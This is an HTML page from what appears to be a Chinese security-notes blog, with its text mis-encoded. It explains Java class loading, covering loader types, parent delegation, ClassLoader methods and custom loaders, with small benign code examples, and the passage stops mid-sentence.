<!-- build time:Wed Dec 27 2023 18:05:50 GMT+0800 (Central Standard Time) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="ä½™æ˜Ÿé…’" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="ä½™æ˜Ÿé…’" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="ä½™æ˜Ÿé…’" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="Javaä»£ç å®¡è®¡,Javaå®‰å…¨åŸºç¡€ç¯‡"><link rel="canonical" href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"><title>1. javaç±»åŠ è½½æœºåˆ¶ - Javaå®‰å…¨åŸºç¡€ - ä»£ç å®¡è®¡ | ä½™æ˜Ÿé…’ = ä½™æ˜Ÿé…’ = ç—´çœ‹å¹´å°‘é£é›¨ç–¾ï¼Œä¸€è½¬æœ¬ç”Ÿè¹‰è·æ¸¸</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">1. javaç±»åŠ è½½æœºåˆ¶</h1><div class="meta"><span class="item" title="åˆ›å»ºæ—¶é—´ï¼š2023-07-16 20:43:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">å‘è¡¨äº</span> <time itemprop="dateCreated datePublished" datetime="2023-07-16T20:43:00+08:00">2023-07-16</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="åˆ‡æ¢å¯¼èˆªæ "><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ä½™æ˜Ÿé…’</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclhnx9glj20zk0m8npd.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclj61ylzj20zk0m8b29.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeyvx1d4j20zk0m8hdt.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexe4oykj20zk0m87ji.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciuja1j1j20zk0m8kjl.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicis3attqj20zk0m8k7l.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">é¦–é¡µ</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="item" rel="index" title="åˆ†ç±»äº ä»£ç å®¡è®¡"><span itemprop="name">ä»£ç å®¡è®¡</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" itemprop="item" rel="index" title="åˆ†ç±»äº Javaå®‰å…¨åŸºç¡€"><span itemprop="name">Javaå®‰å…¨åŸºç¡€</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="ä½™æ˜Ÿé…’"><meta itemprop="description" content="ç—´çœ‹å¹´å°‘é£é›¨ç–¾ï¼Œä¸€è½¬æœ¬ç”Ÿè¹‰è·æ¸¸, æ¬¢è¿å‚è§‚æˆ‘çš„ç¬”è®°ç©ºé—´ ~ è¿™é‡Œä¸»è¦ä¼šè®°å½•ä¸€äº›å®‰å…¨ç›¸å…³çš„å­¦ä¹ ç¬”è®° ğŸŒ¸"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="ä½™æ˜Ÿé…’"></span><div class="body md" itemprop="articleBody"><h1 id="ç±»åŠ è½½æœºåˆ¶"><a class="anchor" href="#ç±»åŠ è½½æœºåˆ¶">#</a> ç±»åŠ è½½æœºåˆ¶</h1><p>Java æ–‡ä»¶é€šè¿‡ç¼–è¯‘å™¨å˜æˆäº†.class æ–‡ä»¶ï¼Œæ¥ä¸‹æ¥ç±»åŠ è½½å™¨æœ‰åˆå°†è¿™äº›.class æ–‡ä»¶åŠ è½½åˆ° JVM ä¸­ï¼Œå…¶ä¸­ç±»è£…è½½å™¨çš„ä½œç”¨å°±æ˜¯ç±»çš„åŠ è½½</p><p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20230715174731029.png" title="image-20230715174731029"></p><p><img data-src="./../Images/image-20230715175006520.png" alt="image-20230715175006520"></p><p>å½“è¿è¡ŒæŸä¸ªç±»çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°è¿™ä¸ªç±»è¿˜æ²¡æœ‰è¢«åŠ è½½ï¼Œé‚£ä¹ˆå°±ä¼šå¦‚ä¸Šè¿‡ç¨‹è¿›è¡ŒåŠ è½½</p><p>Java ç¨‹åºæ˜¯ç”± class æ–‡ä»¶ç»„æˆçš„ä¸€ä¸ªå®Œæ•´çš„åº”ç”¨ç¨‹åºï¼Œåœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œå¹¶ä¸ä¼šä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰çš„ class æ–‡ä»¶è¿›å…¥å†…å­˜ï¼Œè€Œæ˜¯é€šè¿‡ Java çš„ç±»åŠ è½½æœºåˆ¶ï¼ˆClassLoaderï¼‰è¿›è¡ŒåŠ¨æ€åŠ è½½ï¼Œä»è€Œè½¬æ¢æˆ java.lang.Class ç±»çš„ä¸€ä¸ªå®ä¾‹</p><h2 id="ç±»åŠ è½½å™¨çš„ç§ç±»"><a class="anchor" href="#ç±»åŠ è½½å™¨çš„ç§ç±»">#</a> ç±»åŠ è½½å™¨çš„ç§ç±»</h2><h3 id="bootstarp-classloader"><a class="anchor" href="#bootstarp-classloader">#</a> Bootstarp ClassLoader</h3><blockquote><p>å¯åŠ¨ç±»åŠ è½½å™¨ï¼šè¿™ä¸ªç±»åŠ è½½å™¨è´Ÿè´£å°†ä¸€äº›æ ¸å¿ƒçš„ã€è¢« JVM è¯†åˆ«çš„ç±»åŠ è½½è¿›æ¥ï¼Œç”¨ C++ å®ç°ï¼Œä¸ JVM ä¸€ä½“çš„ï¼Œ <code>æ˜¯æ— æ³•ç›´æ¥è·å–åˆ°çš„</code></p></blockquote><h3 id="extension-classloader"><a class="anchor" href="#extension-classloader">#</a> Extension ClassLoader</h3><blockquote><p>æ‰©å±•ç±»åŠ è½½å™¨ï¼šè¿™ä¸ªç±»åŠ è½½å™¨ç”¨æ¥åŠ è½½ Java çš„æ‰©å±•åº“ï¼Œå…¶ç›®å½•åœ¨ <code>jre\lib\ext</code></p></blockquote><h3 id="application-classloader"><a class="anchor" href="#application-classloader">#</a> Application ClassLoader</h3><blockquote><p>App ç±»åŠ è½½å™¨ / ç³»ç»Ÿç±»åŠ è½½å™¨ï¼šç”¨äºåŠ è½½æˆ‘ä»¬è‡ªå·±å®šä¹‰ç¼–å†™çš„ç±»</p></blockquote><h3 id="user-classloader"><a class="anchor" href="#user-classloader">#</a> User ClassLoader</h3><blockquote><p>ç”¨æˆ·è‡ªå·±å®ç°çš„åŠ è½½å™¨ï¼šå½“å®é™…éœ€è¦è‡ªå·±æŒæ§ç±»åŠ è½½è¿‡ç¨‹æ—¶æ‰ä¼šç”¨åˆ°ï¼Œä¸€èˆ¬æ²¡æœ‰ç”¨åˆ°</p></blockquote><blockquote><p>å¯åŠ¨ç±»åŠ è½½å™¨</p></blockquote><p>ClassLoader æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä¸»è¦çš„åŠŸèƒ½æ˜¯ <code>é€šè¿‡æŒ‡å®šçš„ç±»çš„åç§°ï¼Œæ‰¾åˆ°æˆ–ç”Ÿæˆå¯¹åº”çš„å­—èŠ‚ç ï¼Œè¿”å›ä¸€ä¸ª java.lang.Class ç±»çš„å®ä¾‹</code> ï¼Œå¯ä»¥ç»§æ‰¿ ClassLoader ç±»æ¥å®ç°è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨</p><table><thead><tr><th>æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>getParent()</td><td>è¿”å›è¯¥ç±»åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨</td></tr><tr><td>loadClass(String name)</td><td>åŠ è½½åç§°ä¸º name çš„ç±»ï¼Œè¿”å›ç»“æœæ˜¯ java.lang.Class ç±»çš„å®ä¾‹</td></tr><tr><td>findClass(String name)</td><td>æŸ¥æ‰¾åç§°ä¸º name çš„ç±»ï¼Œè¿”å›ç»“æœæ˜¯ java.lang.Class ç±»çš„å®ä¾‹</td></tr><tr><td>findLoadedClass(String name)</td><td>æŸ¥æ‰¾åç§°ä¸º name çš„å·²ç»è¢«åŠ è½½è¿‡çš„ç±»ï¼Œè¿”å›çš„ç»“æœæ˜¯ java.lang.Class ç±»çš„å®ä¾‹</td></tr><tr><td>defindClas(String name, byte[] b, int off, int len)</td><td>æŠŠå­—èŠ‚æ•°ç»„ b ä¸­çš„å†…å®¹è½¬ä¸º java ç±»ï¼Œè¿”å›çš„ç»“æœæ˜¯ java.lang.Class ç±»çš„å®ä¾‹ï¼Œè¯¥æ–¹æ³•è¢«å£°æ˜ä¸º final</td></tr><tr><td>resolvClass(Class&lt;?&gt; c)</td><td>é“¾æ¥æŒ‡å®šçš„ Java ç±»</td></tr></tbody></table><h2 id="åŒäº²å§”æ‰˜æœºåˆ¶"><a class="anchor" href="#åŒäº²å§”æ‰˜æœºåˆ¶">#</a> åŒäº²å§”æ‰˜æœºåˆ¶</h2><p>å¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½çš„è¯·æ±‚ï¼Œé¦–å…ˆä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼Œæ¯ä¸€å±‚æ¬¡çš„ç±»åŠ è½½å™¨éƒ½æ˜¯å¦‚æ­¤ï¼Œå› æ­¤æ‰€æœ‰çš„åŠ è½½è¯·æ±‚æœ€ç»ˆéƒ½åº”è¯¥ä¼ é€åˆ°é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ä¸­ï¼Œåªæœ‰å½“çˆ¶åŠ è½½å™¨åé¦ˆè‡ªå·±æ— æ³•å®Œæˆè¿™ä¸ªåŠ è½½è¯·æ±‚æ—¶ï¼ˆå®ƒçš„æœç´¢èŒƒå›´ä¸­æ²¡æœ‰æ‰¾åˆ°æ‰€éœ€è¦çš„ç±»ï¼‰ï¼Œå­åŠ è½½å™¨æ‰ä¼šèˆ±å®¤è‡ªå·±å»åŠ è½½</p><ol><li>é¦–å…ˆï¼Œæ£€æŸ¥è¯·æ±‚çš„ç±»æ˜¯å¦å·²ç»åŠ è½½è¿‡äº†</li><li>æœªåŠ è½½ï¼Œåˆ™è¯·æ±‚çˆ¶ç±»åŠ è½½å™¨å»åŠ è½½å¯¹åº”è·¯å¾„ä¸‹çš„ç±»</li><li>å¦‚æœåŠ è½½ä¸åˆ°ï¼Œæ‰ç”±ä¸‹é¢çš„å­ç±»ä¾æ¬¡å»åŠ è½½</li></ol><blockquote><p>java.lang.String -&gt; æœ¬åœ°åŠ è½½å™¨ -&gt; æ‰©å±•åŠ è½½å™¨ -&gt; æ ¹ï¼ˆé¡¶å±‚ï¼‰åŠ è½½å™¨</p></blockquote><h1 id="classloaderç±»åŠ è½½æœºåˆ¶"><a class="anchor" href="#classloaderç±»åŠ è½½æœºåˆ¶">#</a> ClassLoaderï¼ˆç±»åŠ è½½æœºåˆ¶ï¼‰</h1><p>Java æ˜¯ä¸€ä¸ªä¾èµ–äº <code>JVM</code> ï¼ˆJava è™šæ‹Ÿæœºï¼‰å®ç°çš„è·¨å¹³å°çš„å¼€å‘è¯­è¨€</p><p>Java ç¨‹åºåœ¨è¿è¡Œå‰éœ€è¦å…ˆç¼–è¯‘æˆ <code>classæ–‡ä»¶</code> ï¼ŒJava ç±»åˆå§‹åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨ <code>java.lang.ClassLoader</code> åŠ è½½ç±»å­—èŠ‚ç ï¼Œ <code>ClassLoader</code> ä¼šè°ƒç”¨ JVM çš„ native æ–¹æ³•ï¼ˆ <code>defineClass0/1/2</code> ï¼‰æ¥å®šä¹‰ä¸€ä¸ª <code>java.lang.Class</code> å®ä¾‹</p><p><strong>JVM æ¶æ„å›¾</strong></p><p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20230715205505718.png" title="image-20230715205505718"></p><h1 id="javaç±»"><a class="anchor" href="#javaç±»">#</a> Java ç±»</h1><p>Java æ˜¯ç¼–è¯‘å‹è¯­è¨€ï¼Œæˆ‘ä»¬ç¼–å†™çš„ java æ–‡ä»¶éœ€è¦ç¼–è¯‘æˆå class æ–‡ä»¶åæ‰èƒ½å¤Ÿè¢« JVM è¿è¡Œ</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>liangc<span class="token punctuation">.</span>classloader</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexJava</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">"this is test, the code is ok ! "</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><ol><li>å¯ä»¥é€šè¿‡ <code>javac</code> è¿›è¡Œç¼–è¯‘ <code>javac IndexJava.java =&gt; IndexJava.class</code></li><li>å¯ä»¥é€šè¿‡ <code>JDK</code> è‡ªå¸¦çš„ <code>javap</code> å‘½ä»¤åæ±‡ç¼– <code>javap -c -p -l IndexJava.class</code></li></ol><p>JVM åœ¨æ‰§è¡Œ <code>IndexJava</code> ä¹‹å‰ä¼šå…ˆè§£æ class äºŒè¿›åˆ¶å†…å®¹ï¼ŒJVM æ‰§è¡Œçš„å…¶å®å°±æ˜¯å¦‚ä¸Š <code>javap</code> å‘½ä»¤ç”Ÿæˆçš„å­—èŠ‚ç ã€‚</p><h1 id="classloader"><a class="anchor" href="#classloader">#</a> ClassLoader</h1><ol><li><p>ä¸€åˆ‡çš„ Java ç±»éƒ½å¿…é¡»ç»è¿‡ JVM åŠ è½½åæ‰èƒ½è¿è¡Œï¼Œè€Œ <code>ClassLoader</code> çš„ä¸»è¦ä½œç”¨å°±æ˜¯ Java ç±»æ–‡ä»¶çš„åŠ è½½</p></li><li><p>åœ¨ JVM ç±»åŠ è½½å™¨ä¸­æœ€é¡¶å±‚çš„æ˜¯ <code>Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼Œè¯¥ç±»åŠ è½½å™¨å®ç°äº JVM å±‚ï¼Œé‡‡ç”¨ C++ ç¼–å†™ï¼‰</code> ã€ <code>Extension ClassLoaderï¼ˆæ‰©å±•ç±»åŠ è½½å™¨ï¼‰</code> ã€ <code>App ClassLoaderï¼ˆç³»ç»Ÿç±»åŠ è½½å™¨ï¼‰</code></p></li><li><p><code>AppClassLoader</code> æ˜¯é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œå¦‚æœç±»åŠ è½½æ—¶æˆ‘ä»¬ä¸æŒ‡å®šç±»åŠ è½½å™¨çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤ä¼šä½¿ç”¨ <code>AppClassLoader</code> åŠ è½½ç±»</p></li><li><p>é€šè¿‡ <code>ClassLoader.getSystemClassLoader()</code> å¯ä»¥è¿”å›çš„ç³»ç»Ÿç±»åŠ è½½å™¨ <code>sun.misc.Launcher$AppClassLoader@18b4aac2</code></p></li></ol><blockquote><p>æŸäº›æ—¶å€™æˆ‘ä»¬è·å–ä¸€ä¸ªç±»çš„ç±»åŠ è½½å™¨æ—¶å€™å¯èƒ½ä¼šè¿”å›ä¸€ä¸ª <code>null</code> å€¼ï¼Œå¦‚: <code>java.io.File.class.getClassLoader()</code> å°†è¿”å›ä¸€ä¸ª <code>null</code> å¯¹è±¡ï¼Œå› ä¸º <code>java.io.File</code> ç±»åœ¨ JVM åˆå§‹åŒ–çš„æ—¶å€™ä¼šè¢« <code>Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼‰</code> åŠ è½½ï¼Œæˆ‘ä»¬åœ¨å°è¯•è·å–è¢« <code>Bootstrap ClassLoader</code> ç±»åŠ è½½å™¨æ‰€åŠ è½½çš„ç±»çš„ <code>ClassLoader</code> æ—¶å€™éƒ½ä¼šè¿”å› <code>null</code></p></blockquote><p><code>ClassLoader</code> ç±»æœ‰å¦‚ä¸‹æ ¸å¿ƒæ–¹æ³•ï¼š</p><ol><li><code>loadClass()</code> ï¼ˆåŠ è½½æŒ‡å®šçš„ Java ç±»ï¼‰</li><li><code>findClass()</code> ï¼ˆæŸ¥æ‰¾æŒ‡å®šçš„ Java ç±»ï¼‰</li><li><code>findLoadedClass()</code> ï¼ˆæŸ¥æ‰¾ JVM å·²ç»åŠ è½½è¿‡çš„ç±»ï¼‰</li><li><code>defineClass()</code> ï¼ˆå®šä¹‰ä¸€ä¸ª Java ç±»ï¼‰</li><li><code>resolveClass()</code> ï¼ˆé“¾æ¥æŒ‡å®šçš„ Java ç±»ï¼‰</li></ol><h1 id="java-ç±»åŠ¨æ€åŠ è½½æ–¹å¼"><a class="anchor" href="#java-ç±»åŠ¨æ€åŠ è½½æ–¹å¼">#</a> Java ç±»åŠ¨æ€åŠ è½½æ–¹å¼</h1><p>Java ç±»åŠ è½½æ–¹å¼åˆ†ä¸º <code>æ˜¾å¼</code> å’Œ <code>éšå¼</code></p><p><code>æ˜¾å¼</code> å³æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ <code>Javaåå°„</code> æˆ–è€… <code>ClassLoader</code> æ¥åŠ¨æ€åŠ è½½ä¸€ä¸ªç±»å¯¹è±¡</p><p><code>éšå¼</code> æŒ‡çš„æ˜¯ <code>ç±»å.æ–¹æ³•å()</code> æˆ– <code>new</code> ç±»å®ä¾‹</p><p><code>æ˜¾å¼</code> ç±»åŠ è½½æ–¹å¼ä¹Ÿå¯ä»¥ç†è§£ä¸ºç±»åŠ¨æ€åŠ è½½ï¼Œå¯ä»¥è‡ªå®šä¹‰ç±»åŠ è½½å™¨å»åŠ è½½ä»»æ„çš„ç±»</p><p><strong>å¸¸ç”¨çš„ç±»åŠ¨æ€åŠ è½½æ–¹å¼</strong></p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// åå°„åŠ è½½ IndexClass ç¤ºä¾‹</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.liangc.classloader.IndexJava"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// ClassLoader åŠ è½½ TestHelloWorld ç¤ºä¾‹</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.liangc.classloader.IndexJava"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><code>Class.forName(&quot;ç±»å&quot;)</code> é»˜è®¤ä¼šåˆå§‹åŒ–è¢«åŠ è½½ç±»çš„é™æ€å±æ€§å’Œæ–¹æ³•ï¼Œå¦‚æœä¸å¸Œæœ›åˆå§‹åŒ–ç±»å¯ä»¥ä½¿ç”¨ <code>Class.forName(&quot;ç±»å&quot;, æ˜¯å¦åˆå§‹åŒ–ç±», ç±»åŠ è½½å™¨)</code> ï¼Œè€Œ <code>ClassLoader.loadClass</code> é»˜è®¤ä¸ä¼šåˆå§‹åŒ–ç±»æ–¹æ³•</p><h1 id="classloader-ç±»åŠ è½½æµç¨‹"><a class="anchor" href="#classloader-ç±»åŠ è½½æµç¨‹">#</a> ClassLoader ç±»åŠ è½½æµç¨‹</h1><p><code>ClassLoader</code> åŠ è½½ <code>com.liangc.classloader.IndexJava</code> ç±»é‡è¦æµç¨‹</p><ol><li><code>ClassLoader</code> ä¼šè°ƒç”¨ <code>public Class&lt;?&gt; loadClass(String name)</code> æ–¹æ³•åŠ è½½ <code>com.liangc.classloader.IndexJava</code> ç±»</li><li>è°ƒç”¨ <code>findLoadedClass</code> æ–¹æ³•æ£€æŸ¥ <code>IndexJava</code> ç±»æ˜¯å¦å·²ç»åˆå§‹åŒ–ï¼Œå¦‚æœ JVM å·²åˆå§‹åŒ–è¿‡è¯¥ç±»åˆ™ç›´æ¥è¿”å›ç±»å¯¹è±¡</li><li>å¦‚æœåˆ›å»ºå½“å‰ <code>ClassLoader</code> æ—¶ä¼ å…¥äº†çˆ¶ç±»åŠ è½½å™¨ï¼ˆ <code>new ClassLoader(çˆ¶ç±»åŠ è½½å™¨)</code> ï¼‰å°±ä½¿ç”¨çˆ¶ç±»åŠ è½½å™¨åŠ è½½ <code>IndexJava</code> ç±»ï¼Œå¦åˆ™ä½¿ç”¨ JVM çš„ <code>Bootstrap ClassLoader</code> åŠ è½½</li><li>å¦‚æœä¸Šä¸€æ­¥æ— æ³•åŠ è½½ <code>IndexJava</code> ç±»ï¼Œé‚£ä¹ˆè°ƒç”¨è‡ªèº«çš„ <code>findClass</code> æ–¹æ³•å°è¯•åŠ è½½ <code>IndexJava</code> ç±»</li><li>å¦‚æœå½“å‰çš„ <code>ClassLoader</code> æ²¡æœ‰é‡å†™äº† <code>findClass</code> æ–¹æ³•ï¼Œé‚£ä¹ˆç›´æ¥è¿”å›ç±»åŠ è½½å¤±è´¥å¼‚å¸¸</li><li>å¦‚æœå½“å‰ç±»é‡å†™äº† <code>findClass</code> æ–¹æ³•å¹¶é€šè¿‡ä¼ å…¥çš„ <code>com.liangc.classloader.IndexJava</code> ç±»åæ‰¾åˆ°äº†å¯¹åº”çš„ç±»å­—èŠ‚ç ï¼Œé‚£ä¹ˆåº”è¯¥è°ƒç”¨ <code>defineClass</code> æ–¹æ³•å» JVM ä¸­æ³¨å†Œè¯¥ç±»</li><li>å¦‚æœè°ƒç”¨ loadClass çš„æ—¶å€™ä¼ å…¥çš„ <code>resolve</code> å‚æ•°ä¸º trueï¼Œé‚£ä¹ˆè¿˜éœ€è¦è°ƒç”¨ <code>resolveClass</code> æ–¹æ³•é“¾æ¥ç±»ï¼Œé»˜è®¤ä¸º false</li><li>è¿”å›ä¸€ä¸ªè¢« JVM åŠ è½½åçš„ <code>java.lang.Class</code> ç±»å¯¹è±¡</li></ol><h1 id="è‡ªå®šä¹‰-classloader"><a class="anchor" href="#è‡ªå®šä¹‰-classloader">#</a> è‡ªå®šä¹‰ ClassLoader</h1><h3 id="loadclass"><a class="anchor" href="#loadclass">#</a> loadClass()</h3><p>loadClass () æ–¹æ³•å¯ä»¥åŠ è½½ç±»å¹¶è¿”å›ä¸€ä¸ª java.lang.Class ç±»å¯¹è±¡ï¼Œå½“ loadClass () æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œä¼šé¦–å…ˆä½¿ç”¨ findLoadedClass () æ–¹æ³•åˆ¤æ–­è¯¥ç±»æ˜¯å¦å·²ç»è¢«åŠ è½½ï¼Œå¦‚æœæœªè¢«åŠ è½½ï¼Œåˆ™ä¼˜å…ˆä½¿ç”¨åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½ã€‚å½“ä¸å­˜åœ¨çˆ¶ç±»åŠ è½½å™¨ï¼Œæ— æ³•å¯¹è¯¥ç±»è¿›è¡ŒåŠ è½½æ—¶ï¼Œåˆ™ä¼šè°ƒç”¨è‡ªèº«çš„ findClass () æ–¹æ³•ï¼Œå› æ­¤å¯ä»¥é‡å†™ findClass () æ–¹æ³•æ¥å®Œæˆä¸€äº›ç±»åŠ è½½çš„ç‰¹æ®Šè¦æ±‚</p><h3 id="è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨"><a class="anchor" href="#è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨">#</a> è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨</h3><p>æ ¹æ® loadClass () æ–¹æ³•çš„æµç¨‹ï¼Œå¯ä»¥å‘ç°é€šè¿‡é‡å†™ findClass () æ–¹æ³•ï¼Œåˆ©ç”¨ defineClass () æ–¹æ³•æ¥å°†å­—èŠ‚ç è½¬æ¢æˆ java.lang.class ç±»å¯¹è±¡ï¼Œå°±å¯ä»¥å®ç°è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨</p><p><code>java.lang.ClassLoader</code> æ˜¯æ‰€æœ‰çš„ç±»åŠ è½½å™¨çš„çˆ¶ç±»ï¼Œ <code>java.lang.ClassLoader</code> æœ‰éå¸¸å¤šçš„å­ç±»åŠ è½½å™¨ï¼Œæ¯”å¦‚æˆ‘ä»¬ç”¨äºåŠ è½½ jar åŒ…çš„ <code>java.net.URLClassLoader</code> å…¶æœ¬èº«é€šè¿‡ç»§æ‰¿ <code>java.lang.ClassLoader</code> ç±»ï¼Œé‡å†™äº† <code>findClass</code> æ–¹æ³•ä»è€Œå®ç°äº†åŠ è½½ç›®å½• class 